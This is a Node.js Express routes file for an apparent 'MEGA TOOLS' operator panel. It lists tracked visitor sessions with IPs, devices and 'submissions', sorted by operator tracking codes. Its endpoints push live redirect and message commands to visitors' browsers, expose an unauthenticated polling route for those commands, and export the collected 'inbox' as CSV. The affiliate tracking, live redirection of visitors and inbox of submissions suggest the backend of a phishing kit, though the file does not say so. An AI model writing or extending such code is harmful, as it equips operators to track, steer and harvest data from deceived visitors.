// ============================================================
// MEGA TOOLS — SESSIONS ROUTES (v5.0 Production Hardened)
// ============================================================

const express = require('express');
const router = express.Router();
const db = require('../database');
const Session = require('../models/Session');
const Link = require('../models/Link');
const User = require('../models/User');
const { ROLES } = require('../models/roles');
const { authenticate } = require('../middleware/auth');
const { getSessionSockets } = require('../services/sessionManager');
const autoTrust = require('../services/autoTrust');
const { toStringId, parseTrackingCode, paginate, now } = require('../utils/helpers');
const CONFIG = require('../config');

// ============================================================
// HELPERS
// ============================================================

function isSessionForAnyCode(session, codes) {
  if (!session || !codes || codes.length === 0) return false;
  const tc = session.trackingCode || '';
  return codes.some(code => tc === code || tc.startsWith(code + '_'));
}

async function getUserTrackingCodes(userId) {
  return User.getTrackingCodesForUser(userId);
}

async function filterSessionsByRole(sessions, user) {
  if (user.role === ROLES.OWNER) return sessions.filter(s => !s.hiddenForAll);
  const codes = await getUserTrackingCodes(user._id);
  const userId = toStringId(user._id);
  let filtered = sessions.filter(s => isSessionForAnyCode(s, codes));
  filtered = filtered.filter(s => {
    if (s.hiddenForAll) return false;
    if (s.hiddenFor && s.hiddenFor.includes(userId)) return false;
    return true;
  });
  return filtered;
}

async function checkSessionAccess(session, user) {
  if (user.role === ROLES.OWNER) return true;
  const codes = await getUserTrackingCodes(user._id);
  return isSessionForAnyCode(session, codes);
}

// ============================================================
// GET SESSIONS
// ============================================================

router.get('/', authenticate, async (req, res) => {
  try {
    let sessions = await db.sessions.read();
    const allUsers = await db.users.read();
    const pageNum = parseInt(req.query.page) || 1;
    const limitNum = parseInt(req.query.limit) || CONFIG.SESSIONS_PER_PAGE;

    sessions = sessions.filter(s => !s.hiddenForAll);

    const enrichSessions = (list) => list.map(s => {
      const tc = s.trackingCode || '';
      const baseTc = tc.includes('_') ? tc.split('_')[0] : tc;
      const matchedUser = allUsers.find(u => u.trackingCode === baseTc || u.trackingCode === tc);
      return { ...s, userName: matchedUser ? (matchedUser.name || matchedUser.username || '') : '' };
    });

    if (req.user.role === ROLES.OWNER) {
      sessions = enrichSessions(sessions);
      sessions.sort((a, b) => {
        if (a.isLive && !b.isLive) return -1;
        if (!a.isLive && b.isLive) return 1;
        return new Date(b.timestamp) - new Date(a.timestamp);
      });
      const result = paginate(sessions, pageNum, limitNum);
      const todayStart = new Date(); todayStart.setHours(0,0,0,0);
      const todaySessions = sessions.filter(s => new Date(s.lastActivity || s.timestamp).getTime() >= todayStart.getTime());
      const uniqueVisitors = new Set(todaySessions.map(s => s.visitorId || s.ip).filter(Boolean)).size;
      return res.json({ 
        sessions: result.data, total: result.total, page: result.page, totalPages: result.totalPages, hasMore: result.hasMore,
        stats: { uniqueSessions: uniqueVisitors, uniqueSubmissions: 0 }
      });
    }

    const codes = await getUserTrackingCodes(req.user._id);
    const userId = toStringId(req.user._id);
    
    const matching = [];
    for (const s of sessions) {
      if (s.hiddenForAll) continue;
      if (!isSessionForAnyCode(s, codes)) continue;
      if (s.hiddenFor && s.hiddenFor.includes(userId)) continue;
      matching.push(s);
    }

    const enriched = enrichSessions(matching);

    enriched.sort((a, b) => {
      if (a.isLive && !b.isLive) return -1;
      if (!a.isLive && b.isLive) return 1;
      return new Date(b.timestamp) - new Date(a.timestamp);
    });

    const total = enriched.length;
    const totalPages = Math.ceil(total / limitNum);
    const startIdx = (pageNum - 1) * limitNum;
    const paginatedSessions = enriched.slice(startIdx, startIdx + limitNum);

    const todayStart = new Date(); todayStart.setHours(0,0,0,0);
    const todayMs = todayStart.getTime();
    const todaySessions = enriched.filter(s => new Date(s.lastActivity || s.timestamp).getTime() >= todayMs);
    const uniqueVisitors = new Set(todaySessions.map(s => s.visitorId || s.ip).filter(Boolean)).size;

    res.json({ 
      sessions: paginatedSessions, total, page: pageNum, totalPages, hasMore: pageNum < totalPages,
      stats: { uniqueSessions: uniqueVisitors, uniqueSubmissions: 0 }
    });
  } catch (err) {
    if (!CONFIG.IS_PRODUCTION) console.error('[Sessions] GET error:', err);
    res.status(500).json({ message: 'Server error' });
  }
});

// ============================================================
// STATS SUMMARY
// ============================================================

router.get('/stats/summary', authenticate, async (req, res) => {
  try {
    let all = await db.sessions.read();
    all = all.filter(s => !s.hiddenForAll);
    all = await filterSessionsByRole(all, req.user);

    const todayStart = new Date();
    todayStart.setHours(0, 0, 0, 0);
    const todayMs = todayStart.getTime();

    const todaySessions = all.filter(s => {
      const sessionTime = new Date(s.lastActivity || s.timestamp).getTime();
      return sessionTime >= todayMs;
    });

    const uniqueVisitorIds = new Set(todaySessions.map(s => s.visitorId || s.ip).filter(Boolean));
    let allTimeSubmissions = 0;
    all.forEach(s => { allTimeSubmissions += (s.submissions?.length || 0); });

    res.json({
      all: {
        live: todaySessions.filter(s => s.isLive).length,
        mobile: todaySessions.filter(s => s.deviceType === 'Mobile').length,
        desktop: todaySessions.filter(s => s.deviceType === 'Desktop').length,
        uniqueSessions: uniqueVisitorIds.size,
        uniqueSubmissions: 0,
        total: todaySessions.length,
        totalAllTime: all.length,
        totalAllTimeSubmissions: allTimeSubmissions,
      }
    });
  } catch (err) {
    if (!CONFIG.IS_PRODUCTION) console.error('[Sessions] Stats error:', err);
    res.status(500).json({ message: 'Server error' });
  }
});

// ============================================================
// ONLINE USERS
// ============================================================

router.get('/online', authenticate, async (req, res) => {
  try {
    const allSessions = await db.sessions.read();
    const allUsers = await db.users.read();
    const nowMs = Date.now();
    const onlineSessions = allSessions.filter(s => {
      if (s.hiddenForAll) return false;
      const lastActivity = new Date(s.lastActivity || s.timestamp || Date.now()).getTime();
      return (nowMs - lastActivity) < CONFIG.SESSION_TIMEOUT_MS;
    });
    const userIdSet = new Set();
    for (const s of onlineSessions) {
      if (s.trackingCode) {
        const user = allUsers.find(u => u.trackingCode && s.trackingCode.startsWith(u.trackingCode));
        if (user) userIdSet.add(toStringId(user._id));
      }
    }
    const onlineUsers = allUsers.filter(u => userIdSet.has(toStringId(u._id)));
    res.json(onlineUsers.map(u => ({
      _id: toStringId(u._id), name: u.name || u.fullName || u.username || 'Unknown',
      username: u.username || '', email: u.email || '', role: u.role || 'user',
      profilePic: u.profilePic || '', trackingCode: u.trackingCode || '', parentId: u.parentId || null,
    })));
  } catch (err) {
    if (!CONFIG.IS_PRODUCTION) console.error('[Sessions] Online error:', err);
    res.status(500).json({ message: 'Server error' });
  }
});

// ============================================================
// HIDE SESSION
// ============================================================

router.post('/:id/hide', authenticate, async (req, res) => {
  try {
    const session = await Session.hideFromUser(req.params.id, req.user._id);
    if (!session) return res.status(404).json({ message: 'Session not found' });
    res.json({ message: 'Hidden', sessionId: req.params.id });
  } catch (err) {
    if (!CONFIG.IS_PRODUCTION) console.error('[Sessions] Hide error:', err);
    res.status(500).json({ message: 'Server error' });
  }
});

// ============================================================
// HYBRID SMART COMMAND SYSTEM
// ============================================================

router.post('/:id/command', authenticate, async (req, res) => {
  try {
    const { action, url, message } = req.body;
    const session = await db.sessions.findById(req.params.id);
    if (!session) return res.status(404).json({ message: 'Session not found' });
    if (!(await checkSessionAccess(session, req.user))) return res.status(403).json({ message: 'Access denied' });

    const updatedSession = await Session.recordCommand(req.params.id, {
      action: action || 'navigate', url: url || '', message: message || ''
    });

    updatedSession.pendingCommand = {
      action: action || 'navigate', url: url || '', message: message || '',
      seq: updatedSession.commandSeq, timestamp: now(),
      expiresAt: new Date(Date.now() + 60000).toISOString()
    };
    await db.sessions.findByIdAndUpdate(req.params.id, { pendingCommand: updatedSession.pendingCommand });

    const io = req.app.get('io');
    const sockets = getSessionSockets();
    const command = {
      action: action || 'navigate', url: url || '', message: message || '',
      seq: updatedSession.commandSeq, visitorId: updatedSession.visitorId,
      trackingCode: updatedSession.trackingCode, timestamp: now(),
    };

    if (io && sockets) {
      if (updatedSession.visitorId) {
        const socketId = sockets[updatedSession.visitorId];
        if (socketId) { io.to(socketId).emit('session_command', command); io.to(socketId).emit('msg_push', { message: message || '', targetUrl: url || '' }); }
      }
      if (updatedSession.trackingCode) {
        io.to('room_' + updatedSession.trackingCode).emit('session_command', command);
        io.to('room_' + updatedSession.trackingCode).emit('msg_push', { message: message || '', targetUrl: url || '' });
      }
    }

    res.json({ success: true, message: 'Command sent', command, sessionId: req.params.id });
  } catch (err) {
    if (!CONFIG.IS_PRODUCTION) console.error('[Sessions] Command error:', err);
    res.status(500).json({ message: 'Server error' });
  }
});

// ============================================================
// REDIRECT-NEW — Direct handler
// ============================================================

router.post('/:id/redirect-new', authenticate, async (req, res) => {
  try {
    const { targetUrl, message } = req.body;
    const sessionId = req.params.id;
    
    const session = await db.sessions.findById(sessionId);
    if (!session) return res.status(404).json({ message: 'Session not found' });
    if (!(await checkSessionAccess(session, req.user))) return res.status(403).json({ message: 'Access denied' });

    const action = message ? 'navigate+message' : 'navigate';
    const url = targetUrl || '';

    const updatedSession = await Session.recordCommand(sessionId, {
      action, url, message: message || ''
    });

    updatedSession.pendingCommand = {
      action, url, message: message || '',
      seq: updatedSession.commandSeq, timestamp: now(),
      expiresAt: new Date(Date.now() + 60000).toISOString()
    };
    await db.sessions.findByIdAndUpdate(sessionId, { pendingCommand: updatedSession.pendingCommand });

    const io = req.app.get('io');
    const sockets = getSessionSockets();
    const command = {
      action, url, message: message || '',
      seq: updatedSession.commandSeq, visitorId: updatedSession.visitorId,
      trackingCode: updatedSession.trackingCode, timestamp: now(),
    };

    if (io && sockets) {
      if (updatedSession.visitorId) {
        const socketId = sockets[updatedSession.visitorId];
        if (socketId) { io.to(socketId).emit('session_command', command); io.to(socketId).emit('msg_push', { message: message || '', targetUrl: url || '' }); }
      }
      if (updatedSession.trackingCode) {
        io.to('room_' + updatedSession.trackingCode).emit('session_command', command);
        io.to('room_' + updatedSession.trackingCode).emit('msg_push', { message: message || '', targetUrl: url || '' });
      }
    }

    res.json({ success: true, message: 'Command sent', command, sessionId });
  } catch (err) {
    if (!CONFIG.IS_PRODUCTION) console.error('[Sessions] Redirect-new error:', err);
    res.status(500).json({ message: 'Server error' });
  }
});

// ============================================================
// HTTP POLLING
// ============================================================

router.get('/pending-command/:trackingCode', async (req, res) => {
  try {
    const { trackingCode } = req.params;
    const visitorId = req.query.visitorId || '';
    const seq = parseInt(req.query.seq) || 0;
    if (!trackingCode) return res.status(400).json({ success: false, message: 'trackingCode required' });

    const allSessions = await db.sessions.read();
    let session = null;
    if (visitorId) session = allSessions.find(s => s.visitorId === visitorId && !s.hiddenForAll);
    if (!session) {
      const code = trackingCode.includes('_') ? trackingCode.split('_')[0] : trackingCode;
      session = allSessions.find(s => {
        const sCode = s.trackingCode ? (s.trackingCode.includes('_') ? s.trackingCode.split('_')[0] : s.trackingCode) : '';
        return sCode === code && !s.hiddenForAll;
      });
    }

    if (!session || !session.pendingCommand) return res.json({ success: true, pending: false, message: 'No pending commands' });
    const pendingCmd = session.pendingCommand;
    if (pendingCmd.seq && pendingCmd.seq <= seq) return res.json({ success: true, pending: false, message: 'Command already processed' });
    if (pendingCmd.expiresAt && new Date(pendingCmd.expiresAt) < new Date()) return res.json({ success: true, pending: false, message: 'Command expired' });

    await db.sessions.findByIdAndUpdate(session._id, { pendingCommand: null });
    res.json({ success: true, pending: true, command: { action: pendingCmd.action, url: pendingCmd.url, message: pendingCmd.message, seq: pendingCmd.seq, timestamp: pendingCmd.timestamp } });
  } catch (err) {
    if (!CONFIG.IS_PRODUCTION) console.error('[Sessions] Pending command error:', err);
    res.status(500).json({ success: false, message: 'Server error' });
  }
});

// ============================================================
// DELETE ALL — Owner Only
// ============================================================

router.post('/delete-all', authenticate, async (req, res) => {
  try {
    if (req.user.role !== ROLES.OWNER) {
      return res.status(403).json({ success: false, message: 'Only Owner can delete all sessions' });
    }

    const result = await autoTrust.manualDeleteAll(req.user._id);

    res.json({ 
      success: true, 
      message: 'Inbox permanently cleared', 
      deletedCount: result.archived,
      expiresAt: result.expiresAt,
      timerPreserved: true
    });
  } catch (err) {
    if (!CONFIG.IS_PRODUCTION) console.error('[Sessions] Delete all error:', err);
    res.status(500).json({ message: 'Server error' });
  }
});

// ============================================================
// EXPORT
// ============================================================

router.get('/export', authenticate, async (req, res) => {
  try {
    let sessions = await db.sessions.read();
    if (req.user.role === ROLES.OWNER) sessions = sessions.filter(s => !s.hiddenForAll);
    else sessions = await filterSessionsByRole(sessions, req.user);
    
    const format = req.query.format || 'csv';
    if (format === 'json') {
      return res.json({ success: true, count: sessions.length, exportedBy: req.user.role,
        data: sessions.map(s => ({ sessionId: s._id, visitorId: s.visitorId, trackingCode: s.trackingCode, ip: s.ip, device: s.deviceType, browser: s.browser, status: s.status, isLive: s.isLive, clicks: s.clicks || 0, submissions: s.submissions?.length || 0, created: s.created_at, lastSeen: s.lastActivity })), timestamp: now() });
    }

    const headers = ['Session ID', 'Visitor ID', 'Tracking Code', 'IP', 'Device', 'Browser', 'Status', 'Live', 'Clicks', 'Submissions', 'Created', 'Last Seen'];
    let csv = headers.join(',') + '\n';
    sessions.forEach(s => { csv += [s._id||'', s.visitorId||'', s.trackingCode||'', s.ip||'', s.deviceType||'', (s.browser||'').replace(/,/g,';'), s.status||'', s.isLive?'Yes':'No', s.clicks||0, s.submissions?.length||0, s.created_at||'', s.lastActivity||''].join(',') + '\n'; });
    res.setHeader('Content-Type', 'text/csv');
    res.setHeader('Content-Disposition', `attachment; filename=inbox_export_${Date.now()}.csv`);
    res.send(csv);
  } catch (err) {
    if (!CONFIG.IS_PRODUCTION) console.error('[Sessions] Export error:', err);
    res.status(500).json({ message: 'Server error' });
  }
});

module.exports = router;